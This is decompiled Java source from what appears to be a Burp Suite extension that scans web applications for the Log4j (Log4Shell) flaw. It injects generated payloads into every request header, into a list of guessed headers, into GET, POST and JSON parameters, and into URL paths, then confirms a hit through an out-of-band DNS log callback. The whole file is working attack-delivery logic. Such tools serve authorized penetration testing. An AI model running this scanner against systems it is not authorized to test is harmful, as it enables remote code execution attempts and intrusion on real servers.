/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package burp.ScanFun;

import burp.BurpExtender;
import burp.Common;
import burp.GenPoc;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.Listen.IBackend;
import burp.utils.Utils;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Log4jScan {
    static final String[] HEADER_GUESS = new String[]{"User-Agent", "Origin", "Referer", "X-Api-Version", "Accept", "X-Forwarded-For", "Accept-Encoding", "Accept-Language", "Cache-Control"};
    private static final String[] poc_log4j404 = new String[]{"?%B2%E9%BF%B4="};

    public static IHttpRequestResponse ScanHeader(IHttpRequestResponse baseRequestResponse, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, IBackend dnslog) {
        List<String> headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
        String reqMethod = helpers.analyzeRequest(baseRequestResponse).getMethod();
        String host = baseRequestResponse.getHttpService().getHost();
        for (int i = 0; i < headers.size(); ++i) {
            List<String> headers_org_POC = helpers.analyzeRequest(baseRequestResponse).getHeaders();
            String poc_string = GenPoc.GenLog4Poc(host, dnslog).get(0);
            String[] tmp = poc_string.split("split_symbol");
            String find_domain = tmp[0];
            String log4jpoc = tmp[1];
            if (!headers_org_POC.get(i).contains(": ")) continue;
            String header_name = headers_org_POC.get(i).split(": ", 2)[0];
            headers_org_POC.set(i, header_name + ": " + log4jpoc);
            baseRequestResponse.getRequest();
            if (reqMethod.equalsIgnoreCase("get")) {
                byte[] body = helpers.buildHttpMessage(headers_org_POC, null);
                IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                if (dnslog.CheckResult(find_domain)) {
                    return requestResponse;
                }
            }
            if (!reqMethod.equalsIgnoreCase("post")) continue;
            int start = helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset();
            byte[] srcbody = baseRequestResponse.getRequest();
            byte[] reqbody = Common.getpostParams(start, srcbody);
            byte[] body = helpers.buildHttpMessage(headers_org_POC, reqbody);
            IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
            if (!dnslog.CheckResult(find_domain)) continue;
            return requestResponse;
        }
        List<String> headers_new_POC = helpers.analyzeRequest(baseRequestResponse).getHeaders();
        String poc_string = GenPoc.GenLog4Poc(host, dnslog).get(0);
        String[] tmp = poc_string.split("split_symbol");
        String find_domain = tmp[0];
        String log4jpoc = tmp[1];
        for (int i = 0; i < HEADER_GUESS.length; ++i) {
            headers_new_POC.add(HEADER_GUESS[i] + ": " + log4jpoc);
        }
        baseRequestResponse.getRequest();
        if (reqMethod.equalsIgnoreCase("get")) {
            byte[] body = helpers.buildHttpMessage(headers_new_POC, null);
            IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
            if (dnslog.CheckResult(find_domain)) {
                return requestResponse;
            }
        }
        if (reqMethod.equalsIgnoreCase("post")) {
            int start = helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset();
            byte[] srcbody = baseRequestResponse.getRequest();
            byte[] reqbody = Common.getpostParams(start, srcbody);
            byte[] body = helpers.buildHttpMessage(headers_new_POC, reqbody);
            IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
            if (dnslog.CheckResult(find_domain)) {
                return requestResponse;
            }
        }
        return null;
    }

    public static IHttpRequestResponse ScanParam(IHttpRequestResponse baseRequestResponse, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, IBackend dnslog) throws UnsupportedEncodingException {
        if (baseRequestResponse.getRequest() != null) {
            List<String> headers;
            String reqMethod = helpers.analyzeRequest(baseRequestResponse).getMethod();
            String host = baseRequestResponse.getHttpService().getHost();
            List<String> pocs = GenPoc.GenLog4Poc(host, dnslog);
            if (reqMethod.equalsIgnoreCase("get")) {
                for (String poc : pocs) {
                    String[] tmp = poc.split("split_symbol");
                    String find_domain = tmp[0];
                    String log4jpoc = tmp[1];
                    headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                    List<String> targertList = Common.ParamAddPocGet(headers.get(0), log4jpoc);
                    for (String target : targertList) {
                        headers.set(0, target);
                        byte[] body = helpers.buildHttpMessage(headers, null);
                        IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                        if (!dnslog.CheckResult(find_domain)) continue;
                        return requestResponse;
                    }
                }
            }
            if (reqMethod.equalsIgnoreCase("post")) {
                IHttpRequestResponse requestResponse;
                byte[] body;
                String log4jpoc;
                String find_domain;
                String[] tmp;
                String reqbodystr;
                byte[] reqbody;
                byte[] srcbody;
                headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                boolean json = false;
                boolean multipart = true;
                String Contenttype = Byte.toString(helpers.analyzeRequest(baseRequestResponse).getContentType());
                for (String header : headers) {
                    if (header.contains("Content-Type: json/application") || header.contains("Content-Type: application/json")) {
                        json = true;
                    }
                    if (!header.contains("multipart/form-data")) continue;
                    multipart = false;
                }
                if (!json && multipart) {
                    int start = helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset();
                    srcbody = baseRequestResponse.getRequest();
                    reqbody = Common.getpostParams(start, srcbody);
                    reqbodystr = new String(Common.getpostParams(start, srcbody), "utf-8");
                    for (String poc : pocs) {
                        tmp = poc.split("split_symbol");
                        find_domain = tmp[0];
                        log4jpoc = tmp[1];
                        List<String> targertList = Common.ParamAddPocPost(reqbodystr, log4jpoc);
                        for (String target : targertList) {
                            body = helpers.buildHttpMessage(headers, target.getBytes(StandardCharsets.UTF_8));
                            requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            if (!dnslog.CheckResult(find_domain)) continue;
                            return requestResponse;
                        }
                    }
                }
                if (json && multipart) {
                    int start = helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset();
                    srcbody = baseRequestResponse.getRequest();
                    reqbody = Common.getpostParams(start, srcbody);
                    reqbodystr = new String(Common.getpostParams(start, srcbody), "utf-8");
                    for (String poc : pocs) {
                        tmp = poc.split("split_symbol");
                        find_domain = tmp[0];
                        log4jpoc = tmp[1];
                        List<String> tragetList = Common.ParamAddPocPostJson(reqbodystr, log4jpoc);
                        for (String target : tragetList) {
                            body = helpers.buildHttpMessage(headers, target.getBytes(StandardCharsets.UTF_8));
                            requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            if (!dnslog.CheckResult(find_domain)) continue;
                            return requestResponse;
                        }
                    }
                }
            }
        }
        return null;
    }

    public static IHttpRequestResponse Scan404(IHttpRequestResponse baseRequestResponse, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, IBackend dnslog) {
        if (baseRequestResponse.getRequest() != null) {
            List<String> headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
            String host = baseRequestResponse.getHttpService().getHost();
            URL url = helpers.analyzeRequest(baseRequestResponse).getUrl();
            List<String> queue_log4j = BurpExtender.MakeQueue(url.getHost(), headers.get(0), BurpExtender.scannedDomainURL_log4j);
            ArrayList<String> path_list_log4j = new ArrayList<String>();
            for (int i = 0; i < queue_log4j.size(); ++i) {
                String path = queue_log4j.get(i);
                Matcher matcher = Pattern.compile("GET (.*?) HTTP/1.1").matcher(path);
                if (!matcher.find()) continue;
                path_list_log4j.add(matcher.group(1));
            }
            BurpExtender.addScannedURL(url.getHost() + ":" + url.getPort(), path_list_log4j, BurpExtender.scannedDomainURL_log4j);
            for (int j = 0; j < queue_log4j.size(); ++j) {
                String poc = GenPoc.GenLog4Poc(host, dnslog).get(0);
                String[] tmp = poc.split("split_symbol");
                String find_domain = tmp[0];
                String log4jpoc = tmp[1];
                String path = queue_log4j.get(j);
                for (int i = 0; i < poc_log4j404.length; ++i) {
                    String fpath = Log4jScan.AddPoc(path, Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + poc_log4j404[i] + log4jpoc.replace("{", "%7b").replace("}", "%7d"));
                    headers.set(0, fpath);
                    byte[] body = helpers.buildHttpMessage(headers, null);
                    IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                    if (requestResponse == null || requestResponse.getResponse() == null || !dnslog.CheckResult(find_domain)) continue;
                    return requestResponse;
                }
            }
        }
        return null;
    }

    public static String AddPoc(String path, String poc) {
        String fpath = "";
        String[] paths = path.split("/");
        for (int i = 0; i < paths.length; ++i) {
            fpath = i == paths.length - 1 ? fpath + paths[i] : (i == paths.length - 2 ? fpath + poc + " HTTP/" : fpath + paths[i] + "/");
        }
        return fpath;
    }
}

